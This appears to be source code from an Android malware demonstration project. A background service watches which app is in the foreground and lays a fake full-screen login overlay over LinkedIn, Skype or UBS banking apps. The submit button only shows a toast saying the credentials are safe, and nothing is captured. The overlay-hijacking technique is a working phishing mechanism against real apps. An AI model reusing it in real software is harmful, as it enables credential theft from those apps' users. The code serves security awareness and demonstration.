package com.geeksonsecurity.malwaredemo;

import android.app.ActivityManager;
import android.app.Service;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Intent;
import android.content.res.Configuration;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.Toast;

import com.geeksonsecurity.malwaredemo.domain.MonitoredProcess;
import com.geeksonsecurity.malwaredemo.domain.Settings;

import java.util.List;
import java.util.SortedMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.TreeMap;


public class MainService extends Service {

    Timer _timer;
    ForegroundAppTimerTask _checkForegroundAppTimerTask;
    Handler _handler;
    public WindowManager _windowManager;
    private Settings _settings;
    private boolean _isOverlayActive;
    private MonitoredProcess _lastInjectedProcess = MonitoredProcess.NONE;

    private void runOnUiThread(Runnable runnable) {
        _handler.post(runnable);
    }

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }

    private String getProcessName() {
        String foregroundProcess = "";
        ActivityManager activityManager = (ActivityManager) getApplicationContext().getSystemService(ACTIVITY_SERVICE);
        // Process running
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            UsageStatsManager mUsageStatsManager = (UsageStatsManager)getSystemService(USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            // We get usage stats for the last 10 seconds
            List<UsageStats> stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000*10, time);
            // Sort the stats by the last time used
            if(stats != null) {
                SortedMap<Long,UsageStats> mySortedMap = new TreeMap<Long,UsageStats>();
                for (UsageStats usageStats : stats) {
                    mySortedMap.put(usageStats.getLastTimeUsed(),usageStats);
                }
                if(mySortedMap != null && !mySortedMap.isEmpty()) {
                    String topPackageName =  mySortedMap.get(mySortedMap.lastKey()).getPackageName();
                    foregroundProcess = topPackageName;
                }
            }
        } else {
            @SuppressWarnings("deprecation") ActivityManager.RunningTaskInfo foregroundTaskInfo = activityManager.getRunningTasks(1).get(0);
            foregroundProcess = foregroundTaskInfo.topActivity.getPackageName();

        }
        return foregroundProcess;
    }

    public void timerCheckForegroundApp() {
        _timer = new Timer();
        _checkForegroundAppTimerTask = new ForegroundAppTimerTask();
        _timer.schedule(_checkForegroundAppTimerTask, 0, 60);
    }

    class ForegroundAppTimerTask extends TimerTask {

        public ForegroundAppTimerTask() {
            super();
        }

        @Override
        public void run() {
            String packageName = getProcessName();

            if (!_isOverlayActive) {
                if (packageName.startsWith("com.linkedin") && _settings.isLinkedinEnabled()) {
                    injectView(MonitoredProcess.LINKEDIN);
                } else if (packageName.startsWith("com.skype") && _settings.isSkypeEnabled()) {
                    injectView(MonitoredProcess.SKYPE);
                } else if (packageName.startsWith("com.ubs.") && _settings.isUbsEnabled()) {
                    injectView(MonitoredProcess.UBS);
                } else {
                    _lastInjectedProcess = MonitoredProcess.NONE;
                }

            }
        }
    }

    private void injectView(final MonitoredProcess process) {
        if (_lastInjectedProcess != process) {
            _isOverlayActive = true;
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    final WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                            WindowManager.LayoutParams.FLAG_FULLSCREEN,
                            PixelFormat.TRANSLUCENT);

                    LayoutInflater li = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);

                    View mainView = null;

                    switch (process) {
                        case LINKEDIN:
                            mainView = li.inflate(R.layout.linkedin_overlay, null);
                            break;
                        case SKYPE:
                            mainView = li.inflate(R.layout.skype_overlay, null);
                            break;
                        case UBS:
                            mainView = li.inflate(R.layout.ubs_overlay, null);
                            break;

                    }

                    if (mainView == null) {
                        _isOverlayActive = false;
                        return;
                    }

                    Button submitButton = (Button) mainView.findViewById(R.id.submit);

                    final View finalMainView = mainView;

                    submitButton.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {
                            Toast.makeText(getApplicationContext(), "Thanks for giving your credentials to the malware, but don't worry the credentials are still safe!", Toast.LENGTH_SHORT).show();
                            _windowManager.removeViewImmediate(finalMainView);
                            _isOverlayActive = false;
                            _lastInjectedProcess = process;
                        }
                    });

                    _windowManager.addView(finalMainView, params);
                }
            });
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        _handler = new Handler();
        _windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        timerCheckForegroundApp();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopForeground(true);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        _settings = Settings.Load(getApplicationContext());
        return START_STICKY;
    }

}
